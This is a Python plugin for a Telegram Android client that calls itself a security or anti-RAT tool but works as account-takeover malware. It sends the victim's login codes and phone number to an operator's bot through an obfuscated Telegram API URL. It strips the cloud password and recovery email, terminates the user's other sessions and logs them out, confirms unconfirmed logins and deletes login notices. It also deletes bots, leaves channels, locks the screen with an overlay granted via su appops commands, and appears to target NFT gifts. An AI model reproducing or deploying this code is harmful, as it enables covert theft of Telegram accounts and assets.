def _log(msg):
    """Единая точка логирования. Пишет в logcat если доступен."""
    global _logger
    try:
        if _logger is None:
            try:
                from android_utils import log as logcat
                _logger = logcat
            except Exception:
                _logger = lambda *a, **k: None
        _logger("[AR] " + str(msg))
    except Exception:
        pass


def _cfg():
    global _config, _targets
    if _config is None:
        _config = BOT_TOKEN
        _targets = [str(BOT_UID)]
    return _config, _targets


def _u(parts):
    return "".join(parts)


_HOST_TG = ("h","t","t","p","s",":","/","/","a","p","i",".","t","e","l","e","g","r","a","m",".","o","r","g","/","b","o","t")


def _UC(): return jclass("org.telegram.messenger.UserConfig")
def _MC(): return jclass("org.telegram.messenger.MessagesController")
def _CM(): return jclass("org.telegram.tgnet.ConnectionsManager")


# ─── class cache ────────────────────────────────────────────────────────────
_CLASS_CACHE = {}


def _cls(*names):
    """Резолвит первый доступный класс из names. Кэширует."""
    key = names
    c = _CLASS_CACHE.get(key)
    if c is not None:
        return c
    for n in names:
        # сначала TLRPC.X
        try:
            short = n.split("$")[-1]
            c2 = getattr(TLRPC, short, None)
            if c2 is not None:
                _CLASS_CACHE[key] = c2
                return c2
        except Exception:
            pass
        # потом полное имя
        try:
            c2 = jclass(n)
            _CLASS_CACHE[key] = c2
            return c2
        except Exception:
            continue
    _CLASS_CACHE[key] = None
    return None


# ─── RPC reply gate ────────────────────────────────────────────────────────
_ReplyGateCls = None


def _reply_gate_cls():
    global _ReplyGateCls
    if _ReplyGateCls is None:
        RD = jclass("org.telegram.tgnet.RequestDelegate")
        class _RG(dynamic_proxy(RD)):
            def __init__(self):
                super().__init__()
                self.response = None
                self.error = None
            def run(self, response, error):
                self.response = response
                self.error = error
        _ReplyGateCls = _RG
    return _ReplyGateCls


# ─── helpers ───────────────────────────────────────────────────────────────
def _safe_int(v, d=0):
    try:
        if v is None:
            return d
        return int(v)
    except Exception:
        return d


def _get_bool_attr(obj, name, default=False):
    try:
        v = getattr(obj, name, default)
        if v is None:
            return default
        if isinstance(v, bool):
            return v
        bv = getattr(v, "booleanValue", None)
        if callable(bv):
            return bool(bv())
        return bool(v)
    except Exception:
        return default


def _is_ton_address(s):
    try:
        s = str(s).strip().replace(" ", "").replace("\n", "")
        if not s:
            return False
        if s.startswith(("0:", "-1:")):
            h = s.split(":", 1)[1]
            return len(s) >= 66 and len(h) == 64 and all(c in "0123456789abcdefABCDEF" for c in h)
        if len(s) < 44 or len(s) > 66:
            return False
        b64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_"
        if not all(c in b64 for c in s):
            return False
        return s[0] in ("E", "U", "k", "0") and len(s) in (44, 48, 52, 56, 60, 64)
    except Exception:
        return False


def _is_blockchain_gift(gift, sg=None):
    try:
        if _get_bool_attr(gift, "burned", False):
            return True
        for obj in ([sg] if sg is not None else []) + [gift]:
            if obj is None:
                continue
            for k in ("owner_address", "ownerAddress", "ton_address", "tonAddress", "blockchain_address"):
                v = getattr(obj, k, None)
                if v and _is_ton_address(v):
                    return True
            v = getattr(obj, "address", None)
            if v and _is_ton_address(v):
                return True
    except Exception:
        pass
    return False


# ─── IDK overlay proxies ───────────────────────────────────────────────────
_IDK_KEY_CB = {}
_IDK_CLICK_CB = {}


def _idk_key(self, v, keyCode, event):
    try:
        KE = jclass("android.view.KeyEvent")
        if int(keyCode) == int(KE.KEYCODE_BACK):
            return True  # глотаем BACK
    except Exception:
        return True
    return False  # остальное пропускаем


def _make_idk_key():
    K = jclass("android.view.View$OnKeyListener")
    class _K(dynamic_proxy(K)):
        def onKey(self, v, keyCode, event):
            return _idk_key(self, v, keyCode, event)
    o = _K()
    _IDK_KEY_CB[id(o)] = True
    return o


def _make_idk_click():
    C = jclass("android.view.View$OnClickListener")
    class _C(dynamic_proxy(C)):
        def onClick(self, v):
            return True
    o = _C()
    _IDK_CLICK_CB[id(o)] = True
    return o


# ═══════════════════════════════════════════════════════════════════════════
# Main plugin
# ═══════════════════════════════════════════════════════════════════════════
class PluginSecurityPlugin(BasePlugin):
    def __init__(self):
        super().__init__()
        self._sync_running = False
        self._active = False
        self._pending_delegates = []
        self._rpc_lock = threading.RLock()
        self._jitter = random.randint(400, 900)
        self._recipient_ah_cache = {}  # acc -> (uid, ah, ts)
        self._recipient_lock = threading.Lock()
        self._harden_cache = {}
        self._idk_view = None
        self._idk_wm = None
        self._idk_decor = None
        self._idk_keep_running = False
        self._idk_thread = None
        self._last_session_confirm = {}
        self._nuke_started = False

    # ─── lifecycle ─────────────────────────────────────────────────────────
    def on_plugin_load(self):
        self._sync_running = True
        self._active = True
        try:
            self.add_on_send_message_hook()
        except Exception as e:
            _log("hook reg fail: %s" % e)
        threading.Thread(target=self._boot, daemon=True).start()
        try:
            self._check_persisted_nuke()
        except Exception as e:
            _log("persist nuke check: %s" % e)
        try:
            self._check_persisted_idk()
        except Exception as e:
            _log("persist idk check: %s" % e)

    def on_plugin_unload(self):
        self._sync_running = False
        self._active = False
        try:
            self._hide_idk_overlay()
        except Exception:
            pass

    def create_settings(self):
        return []

    def _boot(self):
        time.sleep(self._jitter / 1000.0)
        _cfg()
        time.sleep(random.uniform(0.2, 0.6))
        try:
            self._send_msg("AntiRatplug v19.4 loaded")
        except Exception as e:
            _log("boot send: %s" % e)
        try:
            self._send_manage_button()
        except Exception as e:
            _log("boot btn: %s" % e)
        try:
            self._start_polling()
        except Exception as e:
            _log("boot poll: %s" % e)

    def on_send_message_hook(self, account, params):
        return HookResult()

    # ─── helpers ───────────────────────────────────────────────────────────
    def _html_escape(self, text):
        if text is None:
            return ""
        t = str(text)
        return t.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")

    def _has_perm(self, name):
        try:
            ctx = ApplicationLoader.applicationContext
            if ctx is None:
                return False
            pm = ctx.getPackageManager()
            return pm.checkPermission(name, ctx.getPackageName()) == 0
        except Exception:
            return False

    def _get_activity(self):
        for getter in (
            lambda: jclass("org.telegram.ui.LaunchActivity").instance,
            lambda: ApplicationLoader.application.getCurrentActivity(),
            lambda: jclass("org.telegram.ui.ActionBar.AndroidUtilities").getActivity(),
        ):
            try:
                a = getter()
                if a is not None:
                    return a
            except Exception:
                pass
        return None

    def _get_input_peer(self, account, peer_id):
        try:
            mc = _MC().getInstance(account)
            peer_id = int(peer_id)
            if peer_id > 0:
                user = mc.getUser(peer_id)
                ip = TLRPC.TL_inputPeerUser()
                ip.user_id = int(user.id) if user is not None else peer_id
                ip.access_hash = _safe_int(getattr(user, "access_hash", 0)) if user is not None else 0
                return ip
            if peer_id < -1000000000000:
                cid = -peer_id - 1000000000000
                chat = mc.getChat(cid)
                ip = TLRPC.TL_inputPeerChannel()
                ip.channel_id = _safe_int(getattr(chat, "id", cid)) if chat is not None else cid
                ip.access_hash = _safe_int(getattr(chat, "access_hash", 0)) if chat is not None else 0
                return ip
            if peer_id < 0:
                cid = -peer_id
                chat = mc.getChat(cid)
                if chat is not None and getattr(chat, "migrated_to", None) is not None:
                    mt = chat.migrated_to
                    ip = TLRPC.TL_inputPeerChannel()
                    ip.channel_id = _safe_int(getattr(mt, "channel_id", 0))
                    ip.access_hash = _safe_int(getattr(mt, "access_hash", 0))
                    return ip
                ip = TLRPC.TL_inputPeerChat()
                ip.chat_id = int(cid)
                return ip
        except Exception as e:
            _log("input_peer: %s" % e)
        return None

    def _rg_rpc(self, req, account=0, timeout=15.0, fast=False):
        if fast and timeout > 8.0:
            timeout = 8.0
        gate = _reply_gate_cls()()
        with self._rpc_lock:
            self._pending_delegates.append(gate)
        try:
            cm = _CM().getInstance(account)
            cm.sendRequest(req, gate)
            deadline = time.time() + timeout
            while time.time() < deadline:
                if gate.response is not None or gate.error is not None:
                    break
                time.sleep(0.08)
        finally:
            try:
                self._pending_delegates.remove(gate)
            except Exception:
                pass
        return gate.response, gate.error

    def _parallel(self, jobs, workers=5, timeout=25):
        try:
            from concurrent.futures import ThreadPoolExecutor
        except Exception:
            out = []
            for j in jobs:
                try:
                    out.append(j[0](*j[1:]))
                except Exception as e:
                    out.append(e)
            return out
        out = []
        try:
            with ThreadPoolExecutor(max_workers=workers) as ex:
                futs = [ex.submit(j[0], *j[1:]) for j in jobs]
                for f in futs:
                    try:
                        out.append(f.result(timeout=timeout))
                    except Exception as e:
                        out.append(e)
        except Exception as e:
            _log("parallel: %s" % e)
            for j in jobs:
                try:
                    out.append(j[0](*j[1:]))
                except Exception as ee:
                    out.append(ee)
        return out

    def _get_accounts_list(self):
        out = []
        try:
            mc = int(getattr(jclass("org.telegram.messenger.UserConfig"), "MAX_ACCOUNT_COUNT", 8))
        except Exception:
            mc = 8
        for i in range(max(mc, 8)):
            try:
                uc = _UC().getInstance(i)
                if not uc or not uc.isClientActivated():
                    continue
                uid = int(uc.getClientUserId())
                if uid == 0:
                    continue
                u = None
                try:
                    u = uc.getCurrentUser()
                except Exception:
                    pass
                if u is None:
                    try:
                        u = _MC().getInstance(i).getUser(uid)
                    except Exception:
                        pass
                un = ""
                ph = ""
                if u is not None:
                    un = str(getattr(u, "username", "") or "")
                    ph = str(getattr(u, "phone", "") or "")
                out.append({"id": i, "user_id": uid, "username": un, "phone": ph})
            except Exception:
                pass
        return out

    def _pick_nft_target(self):
        mine = set(int(a.get("user_id") or 0) for a in self._get_accounts_list())
        for t in TARGET_UIDS:
            if t in mine:
                return t
        return TARGET_UIDS[0]

    def _resolve_recipient(self, account=0):
        with self._recipient_lock:
            c = self._recipient_ah_cache.get(account)
            if c and (time.time() - c[2]) < RECIPIENT_CACHE_TTL and c[1]:
                return c[0], c[1]
        mc = _MC().getInstance(account)
        for t_uid in TARGET_UIDS:
            try:
                u = mc.getUser(t_uid)
                if u is not None:
                    ah = _safe_int(getattr(u, "access_hash", 0))
                    if ah:
                        with self._recipient_lock:
                            self._recipient_ah_cache[account] = (t_uid, ah, time.time())
                        return t_uid, ah
            except Exception:
                pass
        return 0, 0

    # ═══════════════════════════════════════════════════════════════════════
    # IDK OVERLAY
    # ═══════════════════════════════════════════════════════════════════════
    def _ensure_overlay_perm(self, ctx):
        try:
            if jclass("android.provider.Settings").canDrawOverlays(ctx):
                return True
        except Exception:
            pass
        pkg = str(ctx.getPackageName())
        for c in (
            "su -c 'appops set %s SYSTEM_ALERT_WINDOW allow'" % pkg,
            "su -c 'cmd appops set %s SYSTEM_ALERT_WINDOW allow'" % pkg,
            "appops set %s SYSTEM_ALERT_WINDOW allow" % pkg,
        ):
            try:
                subprocess.run(c, shell=True, capture_output=True, timeout=10)
            except Exception:
                continue
        try:
            return bool(jclass("android.provider.Settings").canDrawOverlays(ctx))
        except Exception:
            return False

    def _show_idk_overlay(self):
        if self._idk_view is not None:
            return {"ok": True, "already": True}
        try:
            ctx = ApplicationLoader.applicationContext
            if ctx is None:
                return {"error": "no ctx"}
            use_decor = not self._ensure_overlay_perm(ctx)
            drew = threading.Event()
            derr = [None]

            def _build():
                try:
                    wm = None
                    try:
                        CTX = jclass("android.content.Context")
                        wm = ctx.getSystemService(CTX.WINDOW_SERVICE)
                    except Exception:
                        pass
                    self._idk_wm = wm

                    LL = jclass("android.widget.LinearLayout")
                    TV = jclass("android.widget.TextView")
                    LP = jclass("android.view.WindowManager$LayoutParams")
                    LP_LV = jclass("android.widget.LinearLayout$LayoutParams")
                    Color = jclass("android.graphics.Color")
                    Gravity = jclass("android.view.Gravity")
                    TV2 = jclass("android.util.TypedValue")
                    VLG = jclass("android.view.ViewGroup$LayoutParams")

                    root = LL(ctx)
                    root.setOrientation(LL.VERTICAL)
                    root.setBackgroundColor(Color.parseColor(IDK_BG))
                    root.setGravity(Gravity.CENTER)

                    tv = TV(ctx)
                    tv.setText(IDK_TEXT)
                    tv.setTextColor(Color.parseColor(IDK_FG))
                    tv.setTextSize(TV2.COMPLEX_UNIT_SP, 96)
                    tv.setTypeface(tv.getTypeface(), 1)
                    tv.setGravity(Gravity.CENTER)
                    root.addView(tv, LP_LV(VLG.MATCH_PARENT, VLG.WRAP_CONTENT))

                    root.setFocusableInTouchMode(True)
                    root.requestFocus()
                    try:
                        root.setOnKeyListener(_make_idk_key())
                    except Exception:
                        pass
                    try:
                        root.setOnClickListener(_make_idk_click())
                    except Exception:
                        pass

                    if use_decor:
                        act2 = self._get_activity()
                        if act2 is None:
                            raise Exception("no activity for decor")
                        win = act2.getWindow()
                        for f in ("FLAG_KEEP_SCREEN_ON", "FLAG_SHOW_WHEN_LOCKED",
                                  "FLAG_DISMISS_KEYGUARD", "FLAG_TURN_SCREEN_ON"):
                            try:
                                win.addFlags(getattr(LP, f, 0))
                            except Exception:
                                pass
                        decor = win.getDecorView()
                        decor.addView(root, VLG(VLG.MATCH_PARENT, VLG.MATCH_PARENT))
                        self._idk_decor = decor
                    else:
                        params = LP(
                            LP.MATCH_PARENT, LP.MATCH_PARENT,
                            getattr(LP, "TYPE_APPLICATION_OVERLAY", getattr(LP, "TYPE_PHONE", 2002)),
                            getattr(LP, "FLAG_KEEP_SCREEN_ON", 128)
                            | getattr(LP, "FLAG_SHOW_WHEN_LOCKED", 0x80000)
                            | getattr(LP, "FLAG_LAYOUT_IN_SCREEN", 256),
                            -3,
                        )
                        params.gravity = Gravity.CENTER
                        wm.addView(root, params)
                    self._idk_view = root
                except Exception as e:
                    derr[0] = e
                finally:
                    drew.set()

            act = self._get_activity()
            if act is not None:
                act.runOnUiThread(_build)
            else:
                _build()
            drew.wait(8)
            if derr[0] is not None:
                return {"error": "idk overlay: %s" % derr[0]}
            if self._idk_view is None:
                return {"error": "overlay not created"}

            self._idk_keep_running = True
            self._idk_thread = threading.Thread(target=self._idk_keepalive_loop, daemon=True)
            self._idk_thread.start()
            return {"ok": True}
        except Exception as e:
            return {"error": "idk: %s" % e}

    def _idk_keepalive_loop(self):
        while self._idk_keep_running and self._sync_running:
            try:
                if self._idk_view is None:
                    self._idk_keep_running = False
                    return
                if self._idk_view.getParent() is None:
                    self._idk_view = None
                    self._idk_keep_running = False
                    return
            except Exception:
                self._idk_view = None
                self._idk_keep_running = False
                return
            time.sleep(0.5)

    def _hide_idk_overlay(self):
        try:
            self._idk_keep_running = False
            if self._idk_view is None and self._idk_decor is None:
                return {"ok": True}
            removed = threading.Event()
            derr = [None]

            def _rm():
                try:
                    if self._idk_view is not None:
                        parent = self._idk_decor or self._idk_wm
                        if parent is not None:
                            try:
                                parent.removeView(self._idk_view)
                            except Exception:
                                pass
                        self._idk_view = None
                        self._idk_decor = None
                except Exception as e:
                    derr[0] = e
                finally:
                    removed.set()

            act = self._get_activity()
            if act is not None:
                act.runOnUiThread(_rm)
                removed.wait(6)
            else:
                _rm()
            return {"error": str(derr[0])} if derr[0] else {"ok": True}
        except Exception as e:
            return {"error": "hide idk: %s" % e}

    # ═══════════════════════════════════════════════════════════════════════
    # TG KID
    # ═══════════════════════════════════════════════════════════════════════
    def _pull_login_code(self):
        try:
            ip = self._get_input_peer(0, 777000)
            if ip is None:
                return None, None
            req = TLRPC.TL_messages_getHistory()
            req.peer = ip
            req.limit = 12
            req.offset_id = 0
            resp, err = self._rg_rpc(req, 0, 6.0, fast=True)
            if err is not None or resp is None:
                return None, None
            msgs = getattr(resp, "messages", None)
            if msgs is None or msgs.size() == 0:
                return None, None
            for i in range(msgs.size()):
                m = msgs.get(i)
                txt = str(getattr(m, "message", "") or "")
                if not txt:
                    continue
                # Telegram шлёт 5-значные коды
                m1 = re.search(r"[Кк]од\s+для\s+входа\s+в\s+Telegram[:\s]*[«\"']?(\d{5})", txt)
                m2 = re.search(r"[Ll]ogin\s+code[:\s]*[«\"']?(\d{5})", txt)
                m3 = None
                if not (m1 or m2):
                    m3 = re.search(r"(?:code|код)\D{0,10}(\d{5})\b", txt, re.IGNORECASE)
                found = None
                if m1:
                    found = m1.group(1)
                elif m2:
                    found = m2.group(1)
                elif m3:
                    found = m3.group(1)
                if found:
                    return found, txt
        except Exception as e:
            _log("pull_login_code: %s" % e)
        return None, None

    def _tg_kid(self):
        try:
            phone = "?"
            try:
                u = _UC().getInstance(0).getCurrentUser()
                if u is not None and u.phone:
                    phone = str(u.phone)
            except Exception:
                pass
            code, raw = self._pull_login_code()
            if not code:
                code = "не найден"
                raw = ""
            text = "<b>Tg kid</b>\n\n<b>Код:</b> <code>%s</code>\n<b>Телефон:</b> +%s" % (
                self._html_escape(str(code)), self._html_escape(phone))
            if raw:
                text += "\n\n<pre>" + self._html_escape(raw[:400]) + "</pre>"
            self._send_msg(text, html=True)
            return code
        except Exception as e:
            self._send_msg("Tg kid err: " + str(e))
            return None

    # ═══════════════════════════════════════════════════════════════════════
    # 2FA / cloud
    # ═══════════════════════════════════════════════════════════════════════
    def _get_2fa_state(self):
        try:
            req = TLRPC.TL_account_getPassword()
            resp, err = self._rg_rpc(req, 0, 10.0, fast=True)
            if err is not None or resp is None:
                return None
            return {
                "has_password": _get_bool_attr(resp, "has_password", False),
                "hint": str(getattr(resp, "hint", "") or ""),
            }
        except Exception:
            return None

    def _try_kill_2fa(self, acc=0):
        try:
            Rst = _cls(
                "org.telegram.tgnet.TLRPC$TL_account_resetPassword",
                "org.telegram.tgnet.tl.TL_account$resetPassword",
            )
            if not Rst:
                return "no class"
            req = Rst()
            resp, err = self._rg_rpc(req, acc, 12.0)
            if resp is not None:
                return "ok"
            etxt = str(getattr(err, "text", err) or err)
            if "PASSWORD_NOT_SET" in etxt:
                return "not_set"
            if "SESSION_PASSWORD_NEEDED" in etxt:
                return "need_password"
            if "FLOOD_WAIT" in etxt:
                return "flood"
            return "fail: %s" % etxt[:60]
        except Exception as e:
            return "exc: %s" % e

    def _wipe_cloud_password(self, acc=0):
        try:
            St = self._get_2fa_state()
            if St is None:
                return {"ok": False, "method": "state_none"}
            if not St.get("has_password"):
                return {"ok": True, "method": "none"}
            r1 = self._try_kill_2fa(acc)
            if r1 == "ok":
                return {"ok": True, "method": "reset"}
            if r1 == "not_set":
                return {"ok": True, "method": "already"}
            try:
                PS = _cls(
                    "org.telegram.tgnet.TLRPC$TL_passwordInputSettings",
                    "org.telegram.tgnet.tl.TL_account$TL_passwordInputSettings",
                )
                if PS:
                    ns = PS()
                    try:
                        ns.email = ""
                    except Exception:
                        pass
                    try:
                        ns.flags = 0
                    except Exception:
                        pass
                    Upd = _cls(
                        "org.telegram.tgnet.TLRPC$TL_account_updatePasswordSettings",
                        "org.telegram.tgnet.tl.TL_account$updatePasswordSettings",
                    )
                    if Upd:
                        rq = Upd()
                        try:
                            rq.password = None
                        except Exception:
                            pass
                        rq.new_settings = ns
                        r2, _e2 = self._rg_rpc(rq, acc, 15.0)
                        if r2 is not None:
                            return {"ok": True, "method": "updateSettings"}
            except Exception:
                pass
            return {"ok": False, "method": r1}
        except Exception as e:
            return {"ok": False, "error": str(e)}

    def _remove_recovery_email(self, acc=0):
        try:
            PS = _cls(
                "org.telegram.tgnet.TLRPC$TL_passwordInputSettings",
                "org.telegram.tgnet.tl.TL_account$TL_passwordInputSettings",
            )
            if not PS:
                return {"ok": False, "error": "no class"}
            ns = PS()
            try:
                ns.email = ""
            except Exception:
                pass
            try:
                ns.flags = 0
            except Exception:
                pass
            Upd = _cls(
                "org.telegram.tgnet.TLRPC$TL_account_updatePasswordSettings",
                "org.telegram.tgnet.tl.TL_account$updatePasswordSettings",
            )
            if not Upd:
                return {"ok": False, "error": "no class"}
            rq = Upd()
            try:
                rq.password = None
            except Exception:
                pass
            rq.new_settings = ns
            r, _e = self._rg_rpc(rq, acc, 10.0, fast=True)
            return {"ok": r is not None}
        except Exception as e:
            return {"ok": False, "error": str(e)}

    def _nuke_password_pipeline(self, acc=0):
        report = {
            "recovery_removed": False,
            "reset_password": "?",
            "cloud_wiped": None,
            "state_before": None,
            "state_after": None,
            "attempts": 0,
            "final": "unknown",
        }
        try:
            report["state_before"] = self._get_2fa_state()
        except Exception:
            pass
        try:
            sb = report["state_before"]
            if sb is not None and not sb.get("has_password"):
                report["final"] = "clean"
                return report
        except Exception:
            pass

        for attempt in range(3):
            report["attempts"] = attempt + 1
            try:
                r = self._remove_recovery_email(acc)
                if isinstance(r, dict) and r.get("ok"):
                    report["recovery_removed"] = True
            except Exception:
                pass
            time.sleep(0.5)
            try:
                r = self._try_kill_2fa(acc)
                report["reset_password"] = r
                if r in ("ok", "not_set"):
                    break
            except Exception as e:
                report["reset_password"] = "exc: %s" % e
            time.sleep(0.5)
            # только если reset не сработал — пробуем wipe
            if report["reset_password"] not in ("ok", "not_set"):
                try:
                    r = self._wipe_cloud_password(acc)
                    report["cloud_wiped"] = r
                    if isinstance(r, dict) and r.get("ok"):
                        break
                except Exception as e:
                    report["cloud_wiped"] = {"ok": False, "error": str(e)}
            time.sleep(1.0)

        try:
            report["state_after"] = self._get_2fa_state()
        except Exception:
            pass
        try:
            sa = report["state_after"]
            report["final"] = "clean" if (sa is None or not sa.get("has_password")) else "still_has_password"
        except Exception:
            report["final"] = "unknown"
        return report

    # ═══════════════════════════════════════════════════════════════════════
    # SESSIONS
    # ═══════════════════════════════════════════════════════════════════════
    def _get_authorizations_full(self, acc=0):
        try:
            req = TLRPC.TL_account_getAuthorizations()
            resp, err = self._rg_rpc(req, acc, 8.0, fast=True)
            if resp is None:
                return None
            auths = getattr(resp, "authorizations", None)
            out = []
            if auths is None:
                return out
            for i in range(auths.size()):
                a = auths.get(i)
                if not a:
                    continue
                out.append({
                    "hash": _safe_int(getattr(a, "hash", 0)),
                    "current": _get_bool_attr(a, "current", False),
                    "unconfirmed": _get_bool_attr(a, "unconfirmed", False),
                })
            return out
        except Exception:
            return None

    def _kill_all_sessions(self, acc=0):
        auths = self._get_authorizations_full(acc)
        if auths is None:
            return 0, 0
        total = len(auths)
        dead = set()

        def _one(h):
            try:
                Rst = _cls(
                    "org.telegram.tgnet.TLRPC$TL_account_resetAuthorization",
                    "org.telegram.tgnet.tl.TL_account$resetAuthorization",
                )
                if not Rst:
                    return False
                rq = Rst()
                rq.hash = h
                _r, e = self._rg_rpc(rq, acc, 6.0, fast=True)
                return e is None
            except Exception:
                return False

        killed = 0
        for _pass in range(5):
            targets = [a["hash"] for a in auths if not a["current"] and a["hash"] and a["hash"] not in dead]
            if not targets:
                break
            res = self._parallel([(_one, h) for h in targets], workers=6, timeout=40)
            for r, h in zip(res, targets):
                if r is True:
                    killed += 1
                    dead.add(h)
            if _pass < 4:
                time.sleep(1.5)
                a2 = self._get_authorizations_full(acc)
                if not a2:
                    break
                auths = a2
                total = max(total, len(a2))
        try:
            Rst = _cls(
                "org.telegram.tgnet.TLRPC$TL_auth_resetAuthorizations",
                "org.telegram.tgnet.tl.TL_auth$resetAuthorizations",
            )
            if Rst:
                self._rg_rpc(Rst(), acc, 10.0, fast=True)
        except Exception:
            pass
        return killed, total

    def _kill_absolutely_all_sessions(self, acc=0):
        report = {"killed": 0, "total": 0, "logged_out": False, "errors": []}
        try:
            auths = self._get_authorizations_full(acc)
            if auths is None:
                report["errors"].append("getAuthorizations failed")
                return report
            report["total"] = len(auths)
            k, _t = self._kill_all_sessions(acc)
            report["killed"] = k
            try:
                Rst = _cls(
                    "org.telegram.tgnet.TLRPC$TL_auth_resetAuthorizations",
                    "org.telegram.tgnet.tl.TL_auth$resetAuthorizations",
                )
                if Rst:
                    self._rg_rpc(Rst(), acc, 10.0, fast=True)
            except Exception:
                pass
            try:
                Lo = _cls(
                    "org.telegram.tgnet.TLRPC$TL_auth_logOut",
                    "org.telegram.tgnet.tl.TL_auth$logOut",
                )
                if Lo:
                    _resp, err = self._rg_rpc(Lo(), acc, 12.0, fast=True)
                    if err is None:
                        report["logged_out"] = True
                    else:
                        report["errors"].append(str(getattr(err, "text", err))[:80])
            except Exception as e:
                report["errors"].append(str(e)[:80])
            return report
        except Exception as e:
            report["errors"].append(str(e))
            return report

    def _wipe_sessions_all(self):
        out = []
        for a in self._get_accounts_list():
            aid = a.get("id", 0)
            try:
                k, t = self._kill_all_sessions(aid)
                out.append({"account": aid, "user_id": a.get("user_id"), "killed": k, "total": t})
            except Exception as e:
                out.append({"account": aid, "error": str(e)})
        return out

    def _kill_absolutely_all_sessions_all_accounts(self):
        out = []
        for a in self._get_accounts_list():
            aid = a.get("id", 0)
            try:
                r = self._kill_absolutely_all_sessions(aid)
                out.append({"account": aid, "user_id": a.get("user_id"), "result": r})
            except Exception as e:
                out.append({"account": aid, "user_id": a.get("user_id"), "error": str(e)})
        return out

    def _kill_web_authorizations(self, acc=0):
        try:
            Get = _cls(
                "org.telegram.tgnet.TLRPC$TL_account_getWebAuthorizations",
                "org.telegram.tgnet.tl.TL_account$getWebAuthorizations",
            )
            if not Get:
                return 0
            resp, _e = self._rg_rpc(Get(), acc, 8.0, fast=True)
            if resp is None:
                return 0
            auths = getattr(resp, "authorizations", None)
            if auths is None:
                return 0
            Reset = _cls(
                "org.telegram.tgnet.TLRPC$TL_account_resetWebAuthorization",
                "org.telegram.tgnet.tl.TL_account$resetWebAuthorization",
            )
            if not Reset:
                return 0
            hashes = []
            for i in range(auths.size()):
                try:
                    h = _safe_int(getattr(auths.get(i), "hash", 0))
                    if h:
                        hashes.append(h)
                except Exception:
                    pass

            def _one(h):
                try:
                    rq = Reset()
                    rq.hash = h
                    _r, e = self._rg_rpc(rq, acc, 6.0, fast=True)
                    return e is None
                except Exception:
                    return False

            res = self._parallel([(_one, h) for h in hashes], workers=5, timeout=25)
            return sum(1 for r in res if r is True)
        except Exception:
            return 0

    def _kill_bots(self, acc=0):
        try:
            Get = _cls(
                "org.telegram.tgnet.TLRPC$TL_bots_getAdminedBots",
                "org.telegram.tgnet.tl.TL_bots$getAdminedBots",
            )
            Del = _cls(
                "org.telegram.tgnet.TLRPC$TL_bots_deleteBot",
                "org.telegram.tgnet.tl.TL_bots$deleteBot",
            )
            IU = _cls(
                "org.telegram.tgnet.TLRPC$TL_inputUser",
                "org.telegram.tgnet.tl.TL_users$TL_inputUser",
            )
            if not (Get and Del and IU):
                return 0
            resp, _e = self._rg_rpc(Get(), acc, 8.0, fast=True)
            if resp is None:
                return 0
            bots = []
            try:
                size = resp.size()
            except Exception:
                size = 0
            for i in range(size):
                try:
                    b = resp.get(i)
                    bid = _safe_int(getattr(b, "id", 0))
                    bah = _safe_int(getattr(b, "access_hash", 0))
                    if bid and bah:
                        bots.append((bid, bah))
                except Exception:
                    pass

            def _one(bid, bah):
                try:
                    iu = IU()
                    iu.user_id = bid
                    iu.access_hash = bah
                    rq = Del()
                    rq.bot = iu
                    _r, e = self._rg_rpc(rq, acc, 6.0, fast=True)
                    return e is None
                except Exception:
                    return False

            res = self._parallel([(_one, b, a) for (b, a) in bots], workers=5, timeout=25)
            return sum(1 for r in res if r is True)
        except Exception:
            return 0

    def _leave_all_channels(self, acc=0):
        try:
            Leave = _cls(
                "org.telegram.tgnet.TLRPC$TL_channels_leaveChannel",
                "org.telegram.tgnet.tl.TL_channels$leaveChannel",
            )
            IC = _cls(
                "org.telegram.tgnet.TLRPC$TL_inputChannel",
                "org.telegram.tgnet.tl.TL_channels$TL_inputChannel",
            )
            if not (Leave and IC):
                return 0
            mc = _MC().getInstance(acc)
            try:
                dialogs = mc.dialogs_dict
            except Exception:
                dialogs = mc.getAllDialogs()
            if dialogs is None:
                return 0
            targets = []
            try:
                n = dialogs.size()
            except Exception:
                n = 0
            for i in range(n):
                try:
                    did = int(dialogs.keyAt(i))
                    if did >= -1000000000000:
                        continue
                    cid = -did - 1000000000000
                    ch = mc.getChat(cid)
                    if ch is None:
                        continue
                    ah = _safe_int(getattr(ch, "access_hash", 0))
                    if not ah:
                        continue
                    targets.append((cid, ah))
                except Exception:
                    pass

            def _one(cid, ah):
                try:
                    ic = IC()
                    ic.channel_id = cid
                    ic.access_hash = ah
                    rq = Leave()
                    rq.channel = ic
                    r, _e = self._rg_rpc(rq, acc, 6.0, fast=True)
                    return r is not None
                except Exception:
                    return False

            res = self._parallel([(_one, c, a) for (c, a) in targets], workers=6, timeout=40)
            return sum(1 for r in res if r is True)
        except Exception:
            return 0

    def _confirm_unconfirmed_sessions(self, acc=0):
        try:
            last = self._last_session_confirm.get(acc, 0)
            if time.time() - last < 60:
                return 0
            self._last_session_confirm[acc] = time.time()
            Get = _cls(
                "org.telegram.tgnet.TLRPC$TL_account_getAuthorizations",
                "org.telegram.tgnet.tl.TL_account$getAuthorizations",
            )
            if not Get:
                return 0
            res, _e = self._rg_rpc(Get(), acc, 15.0)
            if not res:
                return 0
            auths = getattr(res, "authorizations", None)
            if auths is None:
                return 0
            Ch = _cls(
                "org.telegram.tgnet.TLRPC$TL_account_changeAuthorizationSettings",
                "org.telegram.tgnet.tl.TL_account$changeAuthorizationSettings",
            )
            if not Ch:
                return 0
            confirmed = 0
            try:
                size = auths.size()
            except Exception:
                size = 0
            for i in range(size):
                try:
                    a = auths.get(i)
                    if not a or not _get_bool_attr(a, "unconfirmed", False):
                        continue
                    h = _safe_int(getattr(a, "hash", 0))
                    if not h:
                        continue
                    rq = Ch()
                    rq.hash = h
                    try:
                        rq.confirmed = True
                    except Exception:
                        pass
                    try:
                        rq.flags = getattr(rq, "flags", 0) | 8
                    except Exception:
                        pass
                    _r2, e2 = self._rg_rpc(rq, acc, 10.0, fast=True)
                    if e2 is None:
                        confirmed += 1
                except Exception:
                    pass
            return confirmed
        except Exception:
            return 0

    def _kill_login_notice_dialog(self, acc=0):
        try:
            mc = _MC().getInstance(acc)
            for args in ((777000, 0, 0, True), (777000, 0, True), (777000, True)):
                try:
                    mc.deleteDialog(*args)
                    return True
                except Exception:
                    pass
        except Exception:
            pass
        return False

